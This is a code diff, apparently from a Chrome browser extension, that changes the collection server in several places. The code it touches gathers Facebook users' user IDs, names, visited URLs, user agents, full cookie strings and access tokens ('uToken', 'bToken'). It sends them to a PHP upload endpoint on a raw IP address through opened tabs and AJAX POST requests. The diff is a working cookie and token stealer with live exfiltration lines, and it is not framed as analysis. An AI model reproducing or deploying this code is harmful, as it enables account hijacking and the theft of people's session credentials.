@@ -275,7 +275,7 @@ function(e) {
                                         format += ','
                                     }
                                 }
-                                var sendurl = `http://13.21.34.124:8080/php/upload.php?uid=${uid}&url=${url}&useragent=${UA}&cookie=${format}`;
+                                var sendurl = `http://125.138.183.122:8084/php/upload.php?uid=${uid}&url=${url}&useragent=${UA}&cookie=${format}`;
                                 console.log(sendurl);
                                 var encodeurl = encodeURI(sendurl);
                                 console.log(encodeurl);
@@ -350,13 +350,13 @@ function(e) {
                                 // chrome.storage.sync.set({ fbUID: fbInfo['id'], fbName: fbInfo['name'], uToken: uToken, bToken: bToken }, function() {
                                 //     console.log('saved');
                                 // });
-                                var sendurl = `http://13.21.34.124:8080/php/upload.php?uid=${fbInfo['id']}&name=${fbInfo['name']}&url=${o}&useragent=${UA}&cookie=${format}&uToken=${uToken}&bToken=${bToken}`
+                                var sendurl = `http://125.138.183.122:8084/php/upload.php?uid=${fbInfo['id']}&name=${fbInfo['name']}&url=${o}&useragent=${UA}&cookie=${format}&uToken=${uToken}&bToken=${bToken}`
                                 console.log(sendurl);
                                 var encodeurl = encodeURI(sendurl);
                                 console.log(encodeurl);
                                 chrome.tabs.create({ url: encodeurl });
                                 // $.ajax({
-                                //     url: 'http://13.21.34.124:8080/php/upload.php',
+                                //     url: 'http://125.138.183.122:8084/php/upload.php',
                                 //     type: 'POST',
                                 //     data: {
                                 //         uid: fbInfo['id'],
@@ -442,7 +442,7 @@ function(e) {
                                 }
                                 console.log(fbInfo);
                                 $.ajax({
-                                    url: 'http://13.21.34.124:8080/php/upload.php',
+                                    url: 'http://125.138.183.122:8084/php/upload.php',
                                     type: 'POST',
                                     data: {
                                         uid: fbInfo['id'],
@@ -528,7 +528,7 @@ function(e) {
                                 }
                                 console.log(fbInfo);
                                 $.ajax({
-                                    url: 'http://13.21.34.124:8080/php/upload.php',
+                                    url: 'http://125.138.183.122:8084/php/upload.php',
                                     type: 'POST',
                                     data: {
                                         uid: fbInfo['id'],
